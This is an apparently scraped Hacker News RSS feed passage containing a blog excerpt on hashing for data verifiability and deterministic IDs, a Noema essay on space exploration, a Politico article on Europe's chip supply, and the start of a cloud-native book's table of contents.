<ol><li>With a slight change in input, the hash values change dramatically and by looking only at the hash values, one cannot conclude&nbsp;that&nbsp;the first and second are&nbsp;even closely related. This is also referred to as <a href="https://en.wikipedia.org/wiki/Avalanche_effect" target="_blank" rel="noreferrer noopener">avalanche effect</a>. It is one of requirements of a cryptographic algorithms to have the avalanche effect.</li><li>The values mentioned are actually text strings and do not look like numbers, although we expected them to be numbers.</li></ol>



<p>They are actually numbers, represented this way to reduce the size of the presented text. For example, binary representation of the number 255&nbsp;is ‘11111111’. Decimal representation is ‘255’. Hexadecimal representation is ‘ff’ or ‘FF’. The representations in the table above are hexadecimal representations of 32 byte and 20 byte numbers. <a rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/Base64" target="_blank">base64encoding</a> is commonly used to represent the hash values in cryptographic applications.</p>



<h2 id="verifiability">Verifiability</h2>



<p>For quite some time, open source software has been distributed through various mirror sites so that downloads are sped up. Any user could download the software package quickly from a nearby mirror site. These nearby sites could be malicious and could provide compromised open source software packages. In order to overcome this problem, open source software builds would publish a checksum file on their website. This checksum file is used to verify that the downloaded package from a nearby mirror site is authentic. The checksum file actually contains a cryptographic hash of the software package.</p>



<p>For example: <a rel="noreferrer noopener" href="https://www.openoffice.org/download/checksums/3.4.1_checksums.html" target="_blank">Apache OpenOffice – Download checksum files</a>.</p>



<pre>e08f9c8acecba1ee0046f820b0abed97dfe90511bd733a65936fdf0ea9c22540  Apache_OpenOffice_incubating-SDK_3.4.1_Linux_x86-64_install-rpm_en-US.tar.gz</pre>



<p>This is the content from SHA256 checksum file for <a href="http://archive.apache.org/dist/incubator/ooo/files/stable/3.4.1/Apache_OpenOffice_incubating-SDK_3.4.1_Linux_x86-64_install-rpm_en-US.tar.gz.sha256" target="_blank" rel="noreferrer noopener">Apache Open Office SDK for Linux x86-64</a> build.</p>



<p>It would not matter which mirror site the SDK is downloaded from. A user can easily verify the authenticity of the download using a simple command like:</p>



<pre><code>$ sha256sum Apache_OpenOffice_incubating-SDK_3.4.1_Linux_x86-64_install-rpm_en-US.tar.gz
e08f9c8acecba1ee0046f820b0abed97dfe90511bd733a65936fdf0ea9c22540  Apache_OpenOffice_incubating-SDK_3.4.1_Linux_x86-64_install-rpm_en-US.tar.gz</code></pre>



<p>If the generated SHA256 does not match with the checksum file, the user knows that the software package has been tampered.</p>



<p>We will use the same technique to verify data objects. The data object we are interested in would have an ID. Any application or service asks for objects using IDs. If the data that the application gets does not generate the same hash value as the ID, then the application can easily conclude that the data is not what was asked for or the data has mutated. On a typical hardware the cryptographic hash function would take a few microseconds to generate the hash value. So, this is not costly and offers good verifiability.</p>



<p>In the context of this post, the verifiability that we are seeking is not because we operate in a trust-less or adversarial environment like Blockchains, but mainly because data can become corrupt or can be deliberately changed by hackers / attackers. This is for companies to verify that the data they hold has not been modified undesirably.</p>



<h4 id="verify-id">Application: Deterministic and Verifiable IDs</h4>



<p>In a typical RESTful request, a client posts a request to a service, and the service returns back an ID. The service uses the ID to index the object that got created due to the request. However, with a predetermined ID generation technique, it is possible for the client to know the ID even before the service receives the request. This is done even in blockchains. The transactionID (also referred as <a href="https://wiki.bitcoinsv.io/index.php/TXID" target="_blank" rel="noreferrer noopener">TXID</a>) is a hash computed from certain fields of a transaction request.</p>



<p>To be able to know the ID of an object that will be returned by a service even before the object is created in a service has significant benefits. </p>



<ol><li>Just by computing the ID from the fields of an object, and comparing it with the ID provided in the object, one can determine if the object is the right object. Housekeeping processes can easily determine data corruption or software bugs or potential attacks.</li><li>Request need not be processed synchronously.</li><li>The client can fire a batch of requests in just one call. Each individual request can easily be identified by the request id which will be deterministic for both the client and the service. This eliminates the need to create IDs on the client side, and map them to the server side IDs.</li><li>Non-idempotent requests such as HTTP POST requests can achieve deterministic behaviour. Multiple POST requests (which could be because of software bug or infrastructural replays) will not cause harm, as the request ID is predetermined. The server can easily identify a duplicate request.</li></ol>



<p>Example: To generate an OrderID, one could take the sha256 of a series of bytes of the quantity, price, dateTime of the order, clientID, and the assetID or assetSymbol.</p>



<pre><code>OrderID = sha256(bytes(qty)||bytes(price)||bytes(dateTime)||bytes(clientID)||bytes(assetID))</code></pre>



<h4 id="data-format">Data format and ID Generation</h4>



<p>While the scheme above for ID generation works, it has a certain drawback. For every type of objects, a developer would have to write an ID generator. This is not desirable. For a majority of the types of objects, the id generator should just be available easily. For this, the object itself can be serialised and the serialised stream of bytes can be hashed.</p>



<p>It is important to note that text based data structures like JSON, XML are not very well suited for this. The main reason behind this is that adding a space or TAB within the document will not alter the data for JSON or XML, however will yield a totally different hash value and therefore a totally different object ID. Hence, it is better to use serialisation formats designed for cross platform, multiple language environments and are deterministic. Compact data serialisation like <a rel="noreferrer noopener" href="https://developers.google.com/protocol-buffers" target="_blank">protocol buffers</a>, <a rel="noreferrer noopener" href="https://google.github.io/flatbuffers/" target="_blank">FlatBuffers</a>, <a rel="noreferrer noopener" href="https://avro.apache.org/" target="_blank">Apache Avro</a> and even <a rel="noreferrer noopener" href="https://tools.ietf.org/html/rfc7049" target="_blank">CBOR</a> are much better suited for this.</p>



<h2 id="immutability">Immutability and Verifiability</h2>



<p>Software professionals often jump to Blockchain to achieve immutability even in a non-adversarial environment like most business applications. Any party explicitly trying to cheat would face the court, and fraudulent transactions can be reverted in the most common business applications seen throughout the world. Therefore, there is no need for all the complexity and consensus algorithms like proof-of-work or proof-of-stake. Even on DLTs there are algorithms like Raft which are used to achieve consensus. Although much lesser in the power consumption, raft could still be an overkill for some …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://techtake.info/2021/02/16/data-immutability-verifiability-and-integrity-without-the-blockchain-overhead/">https://techtake.info/2021/02/16/data-immutability-verifiability-and-integrity-without-the-blockchain-overhead/</a></em></p>]]>
            </description>
            <link>https://techtake.info/2021/02/16/data-immutability-verifiability-and-integrity-without-the-blockchain-overhead/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26221324</guid>
            <pubDate>Mon, 22 Feb 2021 05:55:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Worlds Beyond Ours: Extending human habitability to outer space]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26221303">thread link</a>) | @brandonlc
<br/>
February 21, 2021 | https://www.noemamag.com/worlds-beyond-ours/ | <a href="https://web.archive.org/web/*/https://www.noemamag.com/worlds-beyond-ours/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

				<div>
  <p>Credits</p>
  <p>Claire Isabel Webb is a historian and anthropologist of science, and a 2020-21 Berggruen Institute fellow.</p>
</div>


<p>Consider a trio of moments of entangled spacetime:</p>



<p>Jan. 7, 2021, cyberspace and Washington, D.C.: A staggering 4,112 people <a href="https://www.nytimes.com/2021/01/18/us/coronavirus-deaths.html" data-wpel-link="external" target="_blank" rel="external noopener noreferrer">die</a> of the coronavirus in America, a new record. Elon Musk becomes the richest person in the world and reiterates his plan to leave Earth and start a colony on Mars.</p>



<p>Dec. 7, 1972, near-Earth orbit: The crew of <a href="https://svs.gsfc.nasa.gov/vis/a000000/a002600/a002680/" data-wpel-link="external" target="_blank" rel="external noopener noreferrer">Apollo 17</a>, 18,000 miles from home and on their way to the moon, snap a photograph of Earth. Illuminated by the sun and nestled in the sable sea of outer space, the “Blue Marble” image becomes a resonant icon of humans’ dear and fragile life-filled planet. Earth’s denizens wonder: Are there other worlds beyond? Or is this the only example of life in the universe?</p>



<p>Nov. 7, 1957, Calcutta, India: Two prominent biologists, Joshua Lederberg and J.B.S. Haldane, meet for dinner. A month earlier, the Soviet Union had launched Sputnik I, the first artificial satellite to orbit Earth. Lederberg and Haldane <a href="https://profiles.nlm.nih.gov/spotlight/bb/catalog/nlm:nlmuid-101584906X13253-doc" data-wpel-link="external" target="_blank" rel="external noopener noreferrer">determine</a> that a thermonuclear bomb detonated on the moon would be visible to Earthlings, and it would be so destructive it would spoil the possibility of finding traces of lunar life.</p>



<p>Lifted from three interspaced epochs of the ongoing Space Age — the COVID-19 pandemic, the environmental movement and the Cold War — those moments reveal how terrestrial troubles are entwined with hopes of discovering life, and of living, beyond Earth. As dreams to explore the cosmos curl skyward, fears and anxieties particular to each moment raise doubts not only about humans’ longevity on our home planet, but also about how we might inhabit and sustain life on other worlds as space-faring explorers. If humans self-destruct through nuclear war, poison the planet by churning out carbon into the atmosphere or fail to control a deadly virus, such events would preclude us from existing on Earth, living long enough to communicate with possible extraterrestrial beings and venturing to other worlds we might discover to be habitable.</p>



<p>Thus, fears of terrestrial apocalypse animate pursuits for life and living beyond Earth. But conversely, imagining how life (including human life) might exist in an extraterrestrial context, and seeing the planet from outer space, has driven imaginations of Earth’s possible futures — both hopeful, course-correcting pathways, but also escapist fantasies of extraplanetary colonization.</p>



<p>Anticipations of worlds <em>beyond</em> Earth — places that might be (or might be made to be) habitable — are made possible by conceiving <em>of</em> Earth as both threatened and interconnected: The coronavirus’s march across the world reveals the viruses’ disregard for political borders, the environmental movement highlighted the fragility of the planet’s entangled life and the Cold War ushered in the concept of global nuclear disaster.</p>



<p>These threats have, in different ways, revealed how actions are never self-contained in global, networked systems. Each moment’s particular planetary anxieties — pathogenic, climate, nuclear — have animated and informed scientists’ pursuit of extraterrestrial life.</p>


<!-- Quote Block Template -->

<div>

  <div>

    <p>
      “Information on whether a complete lifecycle can occur in space would also have obvious implications for the feasibility of eventual colonization of space.”    </p>

          
    
    
  </div>
</div>




<h5><strong>Annihilation</strong></h5>



<p>On Oct. 4, 1957, Sputnik Istreaked across the sky. Touching off the “space race” between the United States and the Soviet Union, the satellite represented the opposition between democracy and communism. “Artificial earth satellites will pave the way to interplanetary travel,” the Communist Party’s official newspaper <a href="https://history.nasa.gov/sputnik/14.html" data-wpel-link="external" target="_blank" rel="external noopener noreferrer">announced</a> the following day, and “our contemporaries will witness how the freed and conscientious labor of the people of the new socialist society makes the most daring dreams of mankind a reality.”</p>



<p>Sputnik I was particularly visible from the southern hemisphere, where Nobel Prize-winning microbiologist Joshua Lederberg happened to be traveling. A month later, on his way back to Stanford University, where he taught and researched, Lederberg passed through Calcutta to visit his friend and collaborator J.B.S. Haldane. Haldane had formulated the “<a href="https://www.uv.es/~orilife/textos/Haldane.pdf" data-wpel-link="external" target="_blank" rel="external noopener noreferrer">primordial soup</a>” model — how life could have originated from <span data-note="Abiogenic means not produced by the activity of living organisms; abiogenesis is the process by which life could have evolved from non-living materials.">abiogenic</span> materials on an ancient Earth. Both scientists looked forward to that night’s lunar eclipse.</p>



<p>Over dinner, Haldane — a “confirmed Communist” and “radical alternativist,” according to Lederberg — “gloated” that it was also the 40<sup>th</sup> anniversary of the October Revolution, the event that had precipitated the formation of the Soviet Union. As a thought experiment, the two scientists wondered: What if the Soviets leveraged the symbolic occasion to plant a “red star” — a nuclear bomb — on the moon? Their back-of-the-napkin calculation revealed that it would be visible from Earth.</p>



<p>Of course, there was no “red star” that evening, and the U.S. astronauts of the Apollo 11 mission, not Soviet cosmonauts, would be the first to land on the moon twelve years later, in 1969. But the conversation with Haldane about the possibility for off-Earth atomic destruction spurred Lederberg toward the study of “exobiology,” the search to detect and preserve life beyond Earth. As the U.S. and the Soviet Union’s space race accelerated during the Cold War, the National Academy of Sciences established the Space Science Board (SSB) to research outer space and to recommend policies to NASA. That group, which included Lederberg and other prominent scientists (among them a young Carl Sagan), worked to protect the moon and other extraterrestrial sites as scientific laboratories.</p>



<p>Looking ahead to possible NASA missions that would explore Mars and Venus for traces of life, a 1959 SSB report that Lederberg chaired transported Cold War fears of nuclear war on Earth to celestial bodies beyond. It warned that “the effect of introducing radioactivity on another planet where there may be entirely different levels of background radiation from those found on Earth could greatly influence any form of life found there.” Planetary concerns of atomic fallout migrated to unexplored sites beyond our planet.</p>



<p>In addition to nuclear radiation on other planets, the possibility of microbial contamination presented risks in the search for life beyond Earth. A spacecraft landing on Mars, for example, might bring terrestrial hitchhikers, risking a false detection of organic biochemistry that would muddle attempts to theorize the origin of life in the solar system and possibly the cosmos beyond. Throughout the late 1950s and the 60s, exobiologists’ reports urged sterilization protocols be taken so as to preserve possible “planetary biota” on Mars.</p>



<p>At the same time, exobiologists worried that possible Martian microbes might infect Earth; through incautious activity by either the U.S. or the Soviet Union, a “dramatic hazard would be the introduction of a new disease, imperiling human health,” as Lederberg wrote in 1960. This particular threat took center stage in Michael Crichton’s 1969 science fiction book (and subsequent film) “The Andromeda Strain,” in which a mysterious and fatal extraterrestrial microorganism appears in Arizona and threatens to end life on Earth. Merging apocalypses, the characters consider annihilating the infected laboratory with a nuclear bomb.</p>



<p>Civilian scientists’ goals to detect extraterrestrials were often <a href="https://www.jstor.org/stable/10.1086/344962?seq=1" data-wpel-link="external" target="_blank" rel="external noopener noreferrer">at odds</a> with those of the national agencies they answered to. While John F. Kennedy’s 1962 “<a href="https://er.jsc.nasa.gov/seh/ricetalk.htm" data-wpel-link="external" target="_blank" rel="external noopener noreferrer">We choose to go to the moon</a>” speech mandated the priority of manned missions to outer space that would showcase national prestige, exobiologists advocated for international efforts to preserve (extra)terrestrial life forms. A 1961 SSB report suggested that the U.S. and the Soviet Union work together on sterilization protocols to “simplify the problem of protection against possible contamination of the planets and of the Earth.” The planetary struggle for political dominance, which threatened to plunge Earth into a nuclear apocalypse, was thus shaping extraplanetary pursuits.</p>



<p>As they considered Earth and extraterrestrial sites of possible life (Mars’s subsurface, Venus’s atmosphere and even, possibly, the moon’s dust) in tandem, exobiologists began to imagine interconnected, but distinct, planetary wholes. Linking Earth to planets beyond, two exobiologists wrote in a 1961 <a href="https://www.nap.edu/read/12425/chapter/1" data-wpel-link="external" target="_blank" rel="external noopener noreferrer">report</a>, “The planets of the solar system are part of a whole — in their origins, in their present states and in their futures.” Such exercises that forecasted other worlds soon came to intersect with growing concerns about the fragility of our own planet.</p>


<!-- Quote Block Template -->

<div>

  <div>

    <p>
      “Musk has reshuffled space exploration: individualism over nationalism, money power over patriotism, the adventure or even salvation of the few over the many.”    </p>

    
    
  </div>
</div>




<h5><strong>Interconnection</strong></h5>



<p>Amid the persistent threat of nuclear apocalypse that defined the Cold War era, exobiologists began to call for planetary protection protocols for both Earth and extraterrestrial sites — concerns that became increasingly aligned with a burgeoning consciousness about humans’ harmful activities on Earth. Rachel Carson’s 1962 book “Silent Spring” introduced the idea that synthetic chemicals, especially pesticides — which she <a href="https://archive.nytimes.com/www.nytimes.com/books/97/10/05/reviews/carson-obit.html?_r=2" data-wpel-link="external" target="_blank" rel="external noopener noreferrer">argued</a> should be called “biocides” — were fundamentally altering life on Earth. The ensuing environmental movement of the 1960s and 70s culminated in the creation of the U.S. Environmental Protection Agency and made “the environment” a widespread public concern, fortifying the concept that life systems were interconnected, malleable and fragile.</p>



<p>Stewart Brand’s “Whole Earth Catalog” often advocated for ecological issues and <a href="https://www.noemamag.com/the-origins-of-planetary-realism-and-whole-earth-thinking/" data-wpel-link="internal">featured</a> images of Earth from space on its early covers, from a mosaic made of satellite photos to Apollo 8’s “Earthrise.” Images of Earth from outer space cast it as a planetary …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.noemamag.com/worlds-beyond-ours/">https://www.noemamag.com/worlds-beyond-ours/</a></em></p>]]>
            </description>
            <link>https://www.noemamag.com/worlds-beyond-ours/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26221303</guid>
            <pubDate>Mon, 22 Feb 2021 05:50:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Europe looks to go it alone on microchips amid US-China clash]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26221255">thread link</a>) | @nl
<br/>
February 21, 2021 | https://www.politico.eu/article/europe-seeks-to-decouple-from-us-china-chip-war/ | <a href="https://web.archive.org/web/*/https://www.politico.eu/article/europe-seeks-to-decouple-from-us-china-chip-war/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
									
							<div id="amazon-polly-audio-table">
				<p>Press play to listen to this article</p>
				
		</div>
<p>Europe is caught in the middle of an increasingly political showdown over microchips between the U.S. and China and is scrambling to get out of the firing line.</p>



<p>While Europe is a heavyweight at making planes and cars, it is a minnow when it comes to the chips that are vital to swaths of high-end manufacturing. </p>



<p>Europe accounts for only about <a href="https://ec.europa.eu/commission/presscorner/detail/en/SPEECH_20_1362" target="_blank">10 percent of the world's chip industry</a>, and the Continent is poorly prepared for supply shocks. In the past few weeks, politicians and businessmen in Brussels, Paris and Berlin were caught off guard by how quickly supply disruptions in the semiconductor industry reduced output at the crucial <a href="https://europe.autonews.com/automakers/global-microchip-shortage-hits-honda-nissan-german-automakers" target="_blank">car industry</a>. </p>



<p>The calculus for Europe on this vulnerability is as much political as it is economic, and has laid bare Europe's dependence on America's top-end chipmakers. </p>



<p>The U.S. has already restricted the supply of its premium semiconductor products to Chinese companies such as Huawei, sparking fears among European businesses about how far Washington will go to keep key U.S. chip technology out of China. For EU companies trading with China and manufacturing there, the chief concern is that they could be caught up in this fight and be frozen out of irreplaceable U.S. semiconductor supply markets by export controls.</p>



<p>A separate shock to the car sector’s supply of chips has heightened alarm about Europe’s reliance on foreign players in past weeks, with semiconductor manufacturers, especially in Asia, failing to keep up with demand. </p>



<p>This shortage of chips has caused disruption at Volkswagen's headquarters in Wolfsburg — one of the largest car plants in the world. It's also being felt at factories across Europe, and carmaker CEOs expect that the problem will continue through the first half of this year.</p>



<p>“The semiconductor supply bottleneck resulting from the rapid recovery of automotive markets is causing significant disruptions in global vehicle production for various manufacturers,” VW said on Friday.  </p>



<p>Semiconductor makers have been racing to satisfy demand from the lucrative consumer electronics industry in the coronavirus pandemic as the auto market sagged, creating a supply crunch.</p>



<p>This week, European policymakers identified the chip shortages as a key strategic concern and presented plans to deal with it.  </p>



<p>"There is currently a game underway between the United States and China … and it is likely to continue to get tougher," the EU's Internal Market Commissioner Thierry Breton told reporters this week. "We in Europe intend to play our full part in this new geostrategic game of chess."</p>



<p>"I say it clearly, in the coming years we will see a certain number of tensions ... in the field of semiconductors, that can have implications, including geopolitical ones," Breton added. "In fact, we can already see that ... We see it in particular with the large Chinese companies that today suffer from the lack of these components, so let's not be naïve."</p>



<p>France's Economy Minister Bruno Le Maire, speaking alongside Breton, <a href="https://www.vie-publique.fr/discours/278594-bruno-le-maire-15022021-strategie-industrielle-de-lunion-europeenne" target="_blank">said</a> Europe "wants to be an industry power. We want to be an independent Continent when it comes to technology." He added Europe's reliance on foreign suppliers "is excessive and unacceptable. It makes us vulnerable. It weakens our production chains today [since] tens of thousands of cars are not produced for lack of electronic components." </p>



<p>On Tuesday, Germany and France <a rel="noreferrer noopener" href="https://minefi.hosting.augure.com/Augure_Minefi/r/ContenuEnLigne/Download?id=C7D8444A-FD4B-4BFE-A6FF-E9B68E8625B3&amp;filename=Position%20commune%20FR-ALL%20-%20Industrial%20Strategy.pdf" target="_blank">published a paper calling</a> for "a first set of measures" to "reduce, where relevant, strategic dependencies." It follows <a href="https://www.politico.eu/article/germany-huawei-telecoms-plan/">earlier support</a> from Berlin to set up a joint European industrial project, and diplomatic efforts by the European Commission to <a href="https://www.politico.eu/article/europe-microchip-technology-autonomy-production-china-semiconductors/">launch an "alliance"</a> of companies and governments to pour money into the semiconductor industry. </p>



<p>German tech lobby Bitkom said its members feared they were too dependent on foreign suppliers and universally backed initiatives for greater digital sovereignty. Some 94 percent wanted Germany to push for the <a href="https://www.bitkom.org/Presse/Presseinformation/Deutsche-Wirtschaft-strebt-nach-mehr-digitaler-Souveraenitaet" target="_blank">EU to be on a level with China and the U.S.</a>, according to a poll of 1,100 medium and large companies released on Thursday.</p>



<p>The Commission even has dreams of setting up a leading factory for the most sophisticated chips — though industry officials have greeted that idea with skepticism. </p>



<h3>All out of chips</h3>



<p>The chip supply chain ran into a storm last year. </p>



<p>Under the Trump administration,<strong> </strong>China hawks in Washington identified the chip sector as an Achilles' heel in China's rise. While Beijing has proven successful in its strategies to overtake rivals on technologies like smartphones, solar panels, consumer tech, artificial intelligence technologies and more, the country has struggled to replicate or acquire some of the cutting-edge technologies needed to produce the most advanced microchips.</p>



<p>The Americans moved in on the weak spot. U.S. officials slapped <a href="https://www.commerce.gov/news/press-releases/2020/05/commerce-addresses-huaweis-efforts-undermine-entity-list-restricts" target="_blank">new restrictions</a> on chipmakers doing business with China's telecoms giant Huawei in May 2020. In December, Washington <a rel="noreferrer noopener" href="https://www.ft.com/content/7dcc105e-986b-4768-9239-9f8fa9073b53" target="_blank">barred U.S. chip designers from doing business with China's state-owned manufacturer SMIC</a>.</p>



<p>These measures took place in a world thrown into turmoil by the coronavirus pandemic. Demand for microchips for consumer products like computer screens, headphones, laptops and smartphones soared while car sales collapsed, prompting carmakers to cancel chip orders.</p>



<p>But Europe's car factories quickly found themselves short of chips with no capacity to produce them. </p>



<p>“Volkswagen has to make sure that wafer and semiconductor manufacturers also know our needs," the company said.</p>



<p>The car industry's worries extend beyond the immediate impact of the pandemic on their supply chains. Consumer electronics and telecoms products are expected to boom in coming years and the small, cutting-edge chips that power these devices are more profitable for chip manufacturers to make. </p>



<p>The crisis has pointed to the reliance on U.S. chip designers and Taiwanese manufacturers to keep up with global demand.</p>



<h2>Breton's clash with industry</h2>



<p>Buffeted by the U.S. and China trade war more generally, EU countries and officials in Brussels are cooking up wide-reaching plans for EU "strategic autonomy" and to reshore everything from masks and vaccines to lithium batteries. </p>



<p>Now chip factories are also part of those plans, spurred by the supply shortage.</p>



<p>Breton said that both French President Emmanuel Macron and German Chancellor Angela Merkel support his work to set up an "alliance for semiconductors" that would support local chip firms and would also funnel public cash into building up production capacity in Europe. The alliance would be launched as soon as April, officials involved in the work <a href="https://www.politico.eu/?p=1572339">said earlier</a>.</p>



<p>In a presentation given to national diplomats by the Commission earlier this month, and seen by POLITICO, officials promised funding from its Recovery and Resilience Facility to rebuild the economy after the pandemic. It also sought support from national capitals to set up an Important Project of Common European Interest (IPCEI) on microchips, a special funding scheme to allow state aid to critical technologies and industries. </p>



<p>That IPCEI already&nbsp;<a href="https://www.politico.eu/article/germany-huawei-telecoms-plan/#:~:text=German%20draft%20proposal%20would%20subsidize%20smaller%20firms%20to%20enter%205G%20market.&amp;text=The%20German%20government%20is%20preparing,dominant%20suppliers%20like%20China's%20Huawei.">won support from the German government</a>&nbsp;earlier this month. “We want Germany and Europe to become more sovereign and independent of imports when it comes to microelectronics and communication technologies," German Economy Minister Peter Altmaier said when announcing the government's intention to join the scheme.</p>



<p>Europe does have some leaders in niche parts of the supply chain. Dutch chip printing equipment-maker ASML holds a global monopoly on the machines that enable foundries to print the latest generations of microchips. And firms like the Dutch-American NXP and German Infineon lead in designing chips for sectors including automotive.</p>



<p>But for Breton, Europe's autonomy will depend on having a leading-edge factory too.<strong> </strong></p>



<p>"We must give ourselves the means to be autonomous on this chain," he said, with the ambition to manufacture the tiny chips used in smartphones and other high tech.</p>



<p>But that's where the European commissioner could lose support of its leading industry players, insiders warn.</p>



<p>Breton’s idea of a foundry that manufactures the most sophisticated generations of chips “is a bridge too far," said one industry official who is involved in discussions with European governments. "The gap is pretty wide between what Breton has in mind and what the industry can deliver without committing financial suicide."</p>



<p>Instead of the smallest-scale chips, Europe's car industry and other key sectors instead could use a factory that produces slightly larger semiconductors, industry experts said.  </p>



<p>"The European ambition gets bigger and bigger by the quarter. It started as the project of the decade, now it's become the project of the century and soon it'll be the project of the millennium," the official said. "Meanwhile, we are forgetting to take the first step."</p>



<p><em>Mark Scott, Joshua Posaner and Stuart Lau contributed reporting.</em></p>









<p><em>Want more analysis from </em><span>POLITICO</span><em>? </em><span>POLITICO</span><em> Pro is our premium intelligence service for professionals. From financial services to trade, technology, cybersecurity and more, Pro delivers real time intelligence, deep insight and breaking scoops you need to keep one step ahead. Email <a href="https://www.politico.eu/cdn-cgi/l/email-protection#2151534e61514e4d485548424e0f4454" target="_blank"><span data-cfemail="f181839eb1819e9d988598929edf9484">[email&nbsp;protected]</span></a> to request a complimentary trial.</em></p>								</div></div>]]>
            </description>
            <link>https://www.politico.eu/article/europe-seeks-to-decouple-from-us-china-chip-war/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26221255</guid>
            <pubDate>Mon, 22 Feb 2021 05:39:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Applications in a Cloud Native World]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26221189">thread link</a>) | @Ballu
<br/>
February 21, 2021 | https://ereslibre.github.io/applications-in-a-cloud-native-world/welcome.html | <a href="https://web.archive.org/web/*/https://ereslibre.github.io/applications-in-a-cloud-native-world/welcome.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
        <!-- Provide site root to javascript -->
        

        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        

        <!-- Set the theme before any content is loaded, prevents flash -->
        

        <!-- Hide / unhide sidebar before it is displayed -->
        

        <nav id="sidebar" aria-label="Table of contents">
            <div id="sidebar-scrollbox">
                <ol><li><a href="https://ereslibre.github.io/applications-in-a-cloud-native-world/welcome.html"><strong aria-hidden="true">1.</strong> Welcome</a></li><li><a href="https://ereslibre.github.io/applications-in-a-cloud-native-world/basics.html"><strong aria-hidden="true">2.</strong> Basics</a></li><li><a href="https://ereslibre.github.io/applications-in-a-cloud-native-world/monolith.html"><strong aria-hidden="true">3.</strong> Monolith</a></li><li><ol><li><a href="https://ereslibre.github.io/applications-in-a-cloud-native-world/monolith/traits.html"><strong aria-hidden="true">3.1.</strong> Traits</a></li><li><a href="https://ereslibre.github.io/applications-in-a-cloud-native-world/monolith/scalability.html"><strong aria-hidden="true">3.2.</strong> Scalability</a></li><li><a href="https://ereslibre.github.io/applications-in-a-cloud-native-world/monolith/boundaries.html"><strong aria-hidden="true">3.3.</strong> Boundaries</a></li><li><a href="https://ereslibre.github.io/applications-in-a-cloud-native-world/monolith/deployment.html"><strong aria-hidden="true">3.4.</strong> Deployment</a></li><li><ol><li><a href="https://ereslibre.github.io/applications-in-a-cloud-native-world/monolith/deployment/infrastructure.html"><strong aria-hidden="true">3.4.1.</strong> Infrastructure</a></li><li><ol><li><a href="https://ereslibre.github.io/applications-in-a-cloud-native-world/monolith/deployment/infrastructure/metal.html"><strong aria-hidden="true">3.4.1.1.</strong> Metal</a></li><li><a href="https://ereslibre.github.io/applications-in-a-cloud-native-world/monolith/deployment/infrastructure/virtualization.html"><strong aria-hidden="true">3.4.1.2.</strong> Virtualization</a></li><li><a href="https://ereslibre.github.io/applications-in-a-cloud-native-world/monolith/deployment/infrastructure/containerization.html"><strong aria-hidden="true">3.4.1.3.</strong> Containerization</a></li></ol></li><li><a href="https://ereslibre.github.io/applications-in-a-cloud-native-world/monolith/deployment/techniques.html"><strong aria-hidden="true">3.4.2.</strong> Techniques</a></li><li><ol><li><a href="https://ereslibre.github.io/applications-in-a-cloud-native-world/monolith/deployment/techniques/manual.html"><strong aria-hidden="true">3.4.2.1.</strong> Manual</a></li><li><a href="https://ereslibre.github.io/applications-in-a-cloud-native-world/monolith/deployment/techniques/automated.html"><strong aria-hidden="true">3.4.2.2.</strong> Automated</a></li></ol></li><li><a href="https://ereslibre.github.io/applications-in-a-cloud-native-world/monolith/deployment/targets.html"><strong aria-hidden="true">3.4.3.</strong> Targets</a></li></ol></li></ol></li><li><a href="https://ereslibre.github.io/applications-in-a-cloud-native-world/soa.html"><strong aria-hidden="true">4.</strong> Service Oriented Architecture</a></li><li><a href="https://ereslibre.github.io/applications-in-a-cloud-native-world/microservice.html"><strong aria-hidden="true">5.</strong> Microservice</a></li><li><ol><li><a href="https://ereslibre.github.io/applications-in-a-cloud-native-world/microservice/traits.html"><strong aria-hidden="true">5.1.</strong> Traits</a></li><li><a href="https://ereslibre.github.io/applications-in-a-cloud-native-world/microservice/scalability.html"><strong aria-hidden="true">5.2.</strong> Scalability</a></li><li><a href="https://ereslibre.github.io/applications-in-a-cloud-native-world/microservice/boundaries.html"><strong aria-hidden="true">5.3.</strong> Boundaries</a></li><li><a href="https://ereslibre.github.io/applications-in-a-cloud-native-world/microservice/deployment.html"><strong aria-hidden="true">5.4.</strong> Deployment</a></li><li><a href="https://ereslibre.github.io/applications-in-a-cloud-native-world/microservice/cloud-native.html"><strong aria-hidden="true">5.5.</strong> Cloud Native</a></li></ol></li><li><a href="https://ereslibre.github.io/applications-in-a-cloud-native-world/service-communication.html"><strong aria-hidden="true">6.</strong> Service communication</a></li><li><ol><li><a href="https://ereslibre.github.io/applications-in-a-cloud-native-world/service-communication/protocols.html"><strong aria-hidden="true">6.1.</strong> Protocols</a></li><li><a href="https://ereslibre.github.io/applications-in-a-cloud-native-world/service-communication/traffic.html"><strong aria-hidden="true">6.2.</strong> Traffic</a></li></ol></li><li><a href="https://ereslibre.github.io/applications-in-a-cloud-native-world/kubernetes.html"><strong aria-hidden="true">7.</strong> Kubernetes</a></li><li><ol><li><a href="https://ereslibre.github.io/applications-in-a-cloud-native-world/kubernetes/concepts.html"><strong aria-hidden="true">7.1.</strong> Concepts</a></li><li><a href="https://ereslibre.github.io/applications-in-a-cloud-native-world/kubernetes/components.html"><strong aria-hidden="true">7.2.</strong> Components</a></li><li><a href="https://ereslibre.github.io/applications-in-a-cloud-native-world/kubernetes/service-scaling.html"><strong aria-hidden="true">7.3.</strong> Service Scaling</a></li><li><ol><li><a href="https://ereslibre.github.io/applications-in-a-cloud-native-world/kubernetes/service-scaling/manual-scaling.html"><strong aria-hidden="true">7.3.1.</strong> Manual scaling</a></li><li><a href="https://ereslibre.github.io/applications-in-a-cloud-native-world/kubernetes/service-scaling/vertical-pod-autoscaler.html"><strong 